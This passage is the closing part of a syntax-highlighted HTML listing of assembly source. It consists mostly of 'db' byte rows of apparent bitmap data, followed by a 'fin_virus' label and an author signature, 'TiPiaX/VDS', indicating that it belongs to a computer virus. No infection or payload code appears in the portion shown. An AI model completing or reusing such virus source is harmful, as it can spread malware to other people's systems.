    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">09Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">07Ah</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">09Bh</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">03Bh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">094h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0C2h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">07Ah</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Ch</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">07Bh</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc2">07Ch</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
</span><span class="sc5">bitmap_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fin_virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I HOPE YOU LIKE IT                                            TiPiaX/VDS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span></div></body>
</html>
